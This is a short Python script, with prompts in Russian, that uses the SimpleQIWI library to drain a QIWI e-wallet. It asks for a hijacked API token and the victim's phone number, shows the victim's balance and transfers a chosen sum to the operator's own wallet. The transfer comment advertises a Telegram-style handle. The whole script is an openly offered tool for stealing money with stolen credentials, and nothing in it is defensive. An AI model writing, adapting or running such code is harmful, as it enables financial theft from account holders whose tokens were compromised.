from SimpleQIWI import *



token=input('Введите токен: ')

phone=input('Введите номер:')

number_kiwi = input('Введите номер вашего киви: ')

amount_pay = int(input('Введите сумму для списания с баланса жертвы:'))

api = QApi(token=token, phone=phone)

print(f'Текущий Баланс:{api.balance}')

api.pay(account=number_kiwi, amount=amount_pay, comment='@DarkKRk Подпишись')


print(f'Остаток на балансе жертвы:{api.balance}')

input()

